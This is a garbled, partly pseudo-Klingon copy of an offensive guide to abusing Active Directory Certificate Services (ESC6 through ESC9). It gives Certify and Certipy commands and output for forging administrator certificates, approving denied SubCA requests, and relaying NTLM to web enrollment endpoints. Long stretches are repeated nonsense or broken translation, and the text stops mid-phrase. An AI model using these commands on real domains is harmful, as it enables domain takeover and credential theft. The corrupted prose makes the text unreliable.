utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following the utilize can organizations whether setting the activated is verify to **command** following
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
**tlhIngan Hol**:

**ghItlh**:
Qapvam qatlh **remote registry access** vItlhutlh, vaj, **alternatIv** qutlh vItlhutlh. 

**HTML**:

<p><strong>ghItlh</strong>:</p>
<p>Qapvam qatlh <strong>remote registry access</strong> vItlhutlh, vaj, <strong>alternatIv</strong> qutlh vItlhutlh.</p>
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) are capable of detecting this misconfiguration and exploiting it:

**Klingon Translation:**

[**Certify**](https://github.com/GhostPack/Certify) jeDlI'pu' [**Certipy**](https://github.com/ly4k/Certipy) 'e' vItlhutlh. vaj vItlhutlh 'e' vItlhutlh je 'e' vItlhutlh.
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
To alter these settings, assuming one possesses **domain administrative** rights or equivalent, the following command can be executed from any workstation:

```
jIyajbe'chugh, **domain administrative** qutlhpu' 'ejwI'vam vItlhutlhlaHchugh, vaj vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vItlhutlhlaHbe'chugh, vaj qatlh vIt
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
To disable this configuration in your environment, the flag can be removed with:

```
ghItlhutlh
```

---
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
May 2022 security updates DaH, **certificates** ngeD **security extension** vItlhutlh **requester's `objectSid` property**. ESC1, SID vItlhutlh SAN. **ESC6** SID vItlhutlh **requester's `objectSid`**, SAN vItlhutlh.\
ESC6, exploit vItlhutlh, system susceptible ESC10 (Weak Certificate Mappings), **SAN vItlhutlh security extension**.
{% endhint %}

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate authority access control vItlhutlh permissions vItlhutlh. permissions vItlhutlh `certsrv.msc` vItlhutlh, CA right-click, properties vItlhutlh, Security tab vItlhutlh. PSPKI module vItlhutlh permissions vItlhutlh enumerate vItlhutlh commands vItlhutlh:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
#### QaH

**`ManageCA`** jev enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.

Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.

Possession of **`ManageCertificates`** jev facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.

A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

{% hint style="warning" %}
In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF\_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
{% endhint %}

Therefore, another attack is presented here.

Perquisites:

* Only **`ManageCA` permission**
* **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
* Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)

The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.

#### Abuse

You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template **CA**-Da **`-enable-template`** parameter-Daq **enabled** QaQ. **SubCA** template, **default** Daq **enabled** QaQ.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
**qaStaHvISmo' 'ej SubCA template Daq certificate ** **'oH request** **.**

**'oH request** **'e' vItlhutlh** **, 'ach** **private key** **jatlh** **'ej request ID** **jatlh** **.**
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA`** **`'ej`** **`Manage Certificates`** **vItlhutlh** **`wej certificate`** **`request`** **`issue`** **`ca`** **`command`** **`'ej`** **`-issue-request <request ID>`** **`parameter`** **ghItlh** **`jImej`** **`certificate`** **`request`**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
'ej vaj, maHegh **ghItlh certificate** vItlhutlh vaj vay' req command 'ej vay' -retrieve <request ID> parameter.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

{% hint style="info" %}
In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!
{% endhint %}

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

* The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
* The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:

```plaintext
cas
```
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` property vItlhutlh enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. vItlhutlh endpoints can be parsed je listed by utilizing the tool **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Certify jol with vItlhutlh
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Certipy jImejDaq certificate request Hoch vItlhutlh template `Machine` pe'vam `User` DaH jImej. vaj template vItlhutlh `-template` parameter vIleghlaH.

[PetitPotam](https://github.com/ly4k/PetitPotam) qet technique vItlhutlh authentication jImej. Domain controllers vaj vItlhutlh `-template DomainController` DaH vIleghlaH.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Qa'vIn QaD - ESC9 <a href="#5485" id="5485"></a>

### Qap

**`msPKI-Enrollment-Flag`** (`0x80000`) laH **`CT_FLAG_NO_SECURITY_EXTENSION`** qar'a'wI'pu' (`szOID_NTDS_CA_SECURITY_EXT` qar'a'wI'pu' chenmoHwI' 'e' vItlhutlh). 'ej 'ej **`StrongCertificateBindingEnforcement`** vItlhutlh'e' `1` (DaH jatlh), 'ej 'ej `2` (DaH jatlh) vItlhutlh'e'. 'ej 'oH 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 